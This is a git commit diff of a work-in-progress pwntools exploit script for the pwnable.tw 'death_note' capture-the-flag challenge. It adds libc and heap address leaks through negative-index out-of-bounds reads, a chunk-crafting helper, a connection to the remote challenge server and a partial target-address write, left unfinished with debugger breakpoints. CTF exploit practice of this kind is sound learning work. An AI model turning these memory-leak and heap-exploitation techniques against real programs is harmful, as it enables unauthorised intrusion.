0336e92c1759ee5d327218f3a88d29b785fd5c8d
dkmos2016 <dkmos2016@126.com>
2021-01-28 03:25:48 -0600

    update

--- death_note_cve.py
+++ death_note_cve.py
@@ -2,6 +2,7 @@
 
 from pwn import *
 import pdb
+import re
 
 def add_note(idx, name):
   p.sendlineafter('Your choice :', '1')
@@ -19,28 +20,88 @@ def del_note(idx):
 
 def _exit():
   p.sendlineafter('Your choice :', '4')
-  
-  
 
-p = process('/home/len/pwnable/death_note')
+def leak_libc():
+  show_note(-7)
+  res = p.recvuntil('Name : ', timeout=3)
+  cont = p.recvline()
+  addr = u32(cont[4:8])
+  
+  stdout_addr = addr - 71
+  print('stdout_addr: {:#x}'.format(stdout_addr))
+  
+  return stdout_addr
 
-count = 10
+def leak_heap():
+  add_note(0, 'a'*0x50)
+  show_note(-484)
+  res = p.recvuntil('Name : ', timeout=3)
+  cont = p.recvline()
+  addr = u32(cont[:4])
+  heap_base = addr - 0x8
+  
+  print('heap_base: {:#x}'.format(heap_base))
+  
+  return addr
+
+def send_chunk(idx, chunk, delim='\x00'):
+  count = chunk.count(delim)
+  
+  new_chunk = chunk.replace(delim, '\x2f')
+
+  pdb.set_trace()
+  add_note(idx, new_chunk)
+  del_note(idx)
+
+  pdb.set_trace()
+
+  print('count: {}'.format(count))
+
+  for i in range(count):
+    
+    pos = chunk.rindex(delim)
+    chunk = chunk[:pos]
+    new_chunk = new_chunk[:pos]+'\x00'
+    print('idx: {}, chunk: {}'.format(i, new_chunk))
+    add_note(idx, new_chunk)
+    del_note(idx)
+    pdb.set_trace()
+
+
+# p = process('/home/len/pwnable/death_note')
+p = remote('chall.pwnable.tw',10201)
+
+count = 20
 context.log_level = 'info'
+target_offset = 0x1b3760
+stdout_offset = 0x1b3d60
 
 if __name__ == '__main__':
-  for i in range(count):
-    show_note(-i)
-    if i != 7:
-      continue
+  
+  stdout_addr = leak_libc()
+  libc_base = stdout_addr - stdout_offset
+  print('libc_base: {:#x}'.format(libc_base))
 
-    res = p.recvuntil('Name : ', timeout=3)
-    if res:
-      context.log_level = 'debug'
-      cont = p.recvuntil('\n')
-      
-      
-      addr = u32(cont[:4])
-      print('idx: -{:d}, value: {:#x}'.format(i, addr))
+  heap_base = leak_heap()
+
+  del_note(0)
+
+  target = libc_base + target_offset
+  print('target: {:#x}'.format(target))
+  # fake_chunk = '\x00'*4 + '\x79\x00\x00\x00' + 'a'*0x20
+  # send_chunk(0, fake_chunk)
+  
+  pdb.set_trace()
+  add_note(0, p32(target)+p32(0))
+  
+
+  pdb.set_trace()
+
+  # add_note(1, 'b'* 0x50)
+  # del_note(-484)
+
+
+  
 
   p.interactive()
 
